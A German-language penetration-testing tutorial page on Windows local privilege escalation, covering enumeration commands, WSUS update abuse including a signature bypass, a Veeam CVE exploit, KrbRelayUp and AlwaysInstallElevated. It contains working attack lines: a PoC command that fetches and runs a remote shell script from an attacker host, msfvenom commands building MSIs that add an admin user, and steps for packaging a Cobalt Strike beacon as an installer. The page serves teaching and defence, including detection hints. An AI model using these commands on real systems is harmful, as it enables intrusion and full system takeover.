# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden von Vektoren zur lokalen Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Workshops und Checklisten aus der Community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das Material zu historischen Angriffen umfasst die DerbyCon-Präsentation zur Rechteausweitung unter Windows.<sup>[[5]](#references)</sup>

## Windows-Grundlagen

### Zugriffstoken

**Wenn Sie nicht wissen, was Windows-Zugriffstoken sind, lesen Sie vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs – DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs – DACLs/SACLs/ACEs finden Sie auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn Sie nicht wissen, was Integritätsstufen unter Windows sind, lesen Sie vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Mechanismen, die **die Enumeration des Systems verhindern**, das Ausführen von Programmen unterbinden oder sogar **Ihre Aktivitäten erkennen** können. Sie sollten die folgende **Seite lesen** und alle diese **Abwehrmechanismen enumerieren**, bevor Sie mit der Enumeration zur Rechteausweitung beginnen:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem dazu führen, dass eine Offline-Bearbeitung des UEFI-NVRAM in DMA vor dem Booten und eine Kette zum Patchen des Windows-`SYSTEM`-Speichers mündet:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Aufforderungen High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen Workflow zum Umgehen von UIAccess/Admin Protection finden Sie hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Registrierungseinträgen für Barrierefreiheit auf dem Secure Desktop kann für beliebige Schreibzugriffe auf die SYSTEM-Registrierung (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Angriffsweg über **SMB beliebiger Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung zurückgespiegelt wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration der Versionsinformationen

Prüfen Sie, ob für die Windows-Version bekannte Schwachstellen existieren (prüfen Sie auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **riesige Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und mögliche passende Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die des Betriebssystems. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein fehlendes KB-Update beweist nicht, dass ein Exploit möglich ist. Vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das genaue Problem.

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten oder andere brisante Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie diese Funktion aktivieren: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Ordner „Dokumente“ jedes Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann Dateien jedoch in einen freigegebenen oder versteckten Ordner umleiten. Prüfen Sie den tatsächlich verwendeten Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript untersuchen: Es kann Befehlsargumente und Ausgaben enthalten, einschließlich Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, darunter ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um diese Funktion zu aktivieren, folgen Sie den Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowersShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitätsnachweis und die gesamten Inhalte der Skriptausführung werden erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail aller Aktivitäten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Protokollierungsereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Betrieb**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ein HTTP-WSUS-Endpunkt ist ein Prüfhinweis für das Abfangen von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Als Erstes prüfst du, ob das Netzwerk ein WSUS-Update ohne SSL verwendet. Führe dazu Folgendes in cmd aus:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Wenn `UseWUServer` den Wert `1` hat, verwendet Windows Update den konfigurierten Intranetdienst. Dies bestätigt eine Voraussetzung für den HTTP-Interception-Pfad, beweist jedoch nicht, dass Interception, die Annahme bösartiger Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert `0` ist, wird dieser bestimmte konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden – dabei handelt es sich um weaponized MiTM-Exploit-Skripte, die „gefälschte“ Updates in nicht per SSL geschützten WSUS-Datenverkehr einschleusen.

Lesen Sie hier die Recherche:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen wird bei diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzerproxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und Code mit erhöhten Rechten auf unserem System ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, greift er auch auf dessen Zertifikatspeicher zu. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat zum Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Validierung des Zertifikats durchzuführen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Pfad besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie delegierte WSUS-Berechtigungen und ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte, um Updates zu genehmigen](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), und [dokumentiert die Vertrauensbeziehung für die Veröffentlichung](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Stellen Sie sicher, dass das infrage kommende Update signiert und akzeptiert wird, für das Ziel anwendbar ist und in einem stärker privilegierten Kontext installiert wird, bevor Sie dies als Privilegieneskalationspfad einstufen. Ein HTTP-`WUServer`-Wert oder Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter SUSDB-Updates: nicht signierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die gespeicherten Prozeduren der **WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist die Weiterleitung des Computerkontos eines Upstream-WSUS-Servers an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab; listen Sie daher zuerst die `EXECUTE`-Berechtigungen auf, anstatt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Den separaten Angriffspfad, bei dem WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM-Relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Veröffentlichungs-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzung sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Inhalts-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem Sie die Inhalts-URL und die Zielgruppe festgelegt haben, sieht die abschließende Genehmigung etwa wie folgt aus. Verwenden Sie neue Update-, Gruppen- und Bereitstellungskennungen, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signatur-Bypass

WSUS weist normalerweise beliebige nicht signierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Zertifikatsprüfungs-Flag auf false, wenn der angegebene Dateiname auf `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne zuvor zu prüfen, ob die Bytes tatsächlich Text oder ein gültiges ESD-Image sind. Daher kann eine unveränderte PE-Datei mit einem Namen wie `payload.exe.txt` die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprungsserver muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung zunächst über `HEAD`/`GET` und anschließend über Byte-Range-Anfragen erfolgt. Ein Server ohne Unterstützung für Range-Anfragen erzeugt beim WSUS-Synchronisieren das Ereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zum Ausführen und wird mit `BitsWebServer.py` für das Content-Staging ausgeliefert. Ein minimaler Aufruf in einem autorisierten Lab ist:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch erneute Versuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort erneut angeboten, nachdem der Callback-Prozess beendet wurde. Das Verhalten bei erneuten Versuchen kann daher zu wiederkehrender Ausführung als Persistenzmechanismus werden; es ist jedoch auffällig, weil der Client einen Status für fehlgeschlagene Updates anzeigt.<sup>[[39]](#references)</sup>

#### Ansatzpunkte für Erkennung und Härtung

Nützliche server- und clientseitige Ansatzpunkte in dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Zielgruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` sowie von unerwarteten Principals (insbesondere Nicht-Computerkonten) vorgenommene Deployments untersuchen.
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, das falsch geschriebene `FileVerficationFailed` und `EventId=364` prüfen; die Verifizierung mit der Payload-Erweiterung und dem Content-Magic-Wert abgleichen, statt dem Suffix zu vertrauen.
- Nach wiederholt fehlschlagenden/erneut versuchten Windows-Update-Installationen sowie nach PE-Ausführung oder unerwarteten untergeordneten Prozessen/Netzwerkaktivitäten von Inhalten mit den Namen `.txt` oder `.esd` suchen.
- Extended Protection for Authentication für den Datenbankdienst aktivieren, sofern unterstützt, und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Drittanbieter-Auto-Updater und Agent-IPC (lokaler privesc)

Viele Enterprise-Agenten bieten eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal. Wenn die Registrierung zu einem Angreifer-Server umgeleitet werden kann und der Updater einer gefälschten Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein schädliches MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Hinweis](https://www.veeam.com/kb4424) beschreibt die nicht authentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann an mehr als localhost gebunden sein; prüfen Sie daher die tatsächliche Adresse und PID.

- **Aufklärung**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt und die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patch-Prüfung.
- **Mindestversionen mit Fix**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste Releases mit Fix; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch auf denselben Build-Nummern unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als gefixt einstufen.
- **Exploit**: Ein PoC wie `VeeamHax.exe` mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und anschließend über den lokalen Socket einen SYSTEM-Payload auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der zitierte PoC demonstriert die Ausführung von Befehlen als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; im Advisory des Herstellers wird das Problem der Offenlegung von Zugangsdaten beschrieben.
## KrbRelayUp

Ein lokales Kerberos-Relay kann einen Anmeldevorgang mit geringeren Berechtigungen in einen privilegierten Schreibzugriff auf ein Verzeichnis überführen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal über Berechtigungen für das Zielobjekt verfügt. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) sowohl RBCD- als auch `msDS-KeyCredentialLink`-LDAP-Schreibzugriffe (Shadow-Credential); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert passende Delegierung und Berechtigungen für das Zielobjekt, während eine Shadow-Credential-Kette Schreibrechte für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner dieser Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselebenen der ausgewählten COM-Klasse. Der Anmeldetyp und der Anmeldeinformationskontext des Aufrufers sind wichtig: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachte eine permissive Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibzugriffe auslösen. Eine Shadow-Credential eines Computerkontos kann zu einem Computerticket führen und – nur wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt – zu einem separaten DCSync-Pfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese beiden Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer unabhängig von ihren Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit-Payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUp, um im aktuellen Verzeichnis eine Windows-MSI-Datei zur Rechteausweitung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zum Hinzufügen eines Benutzers/einer Gruppe auffordert (Sie benötigen daher GIU-Zugriff):

```
Write-UserAddMSI
```

Just execute the created binary to escalate privileges.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI-Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.

{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- Erstelle mit Cobalt Strike oder Metasploit einen **neuen Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende `C:\privesc` als Speicherort, wähle **place solution and project in the same directory** und klicke auf **Create**.
- Klicke auf **Next**, bis du zu Schritt 3 von 4 gelangst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle den soeben erstellten Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere in den **Properties** den Wert von **TargetPlatform** von **x86** in **x64**.
  - Du kannst weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte App seriöser wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter **Custom Action Properties** den Wert von **Run64Bit** in **True**.
- Erstelle schließlich den Build.
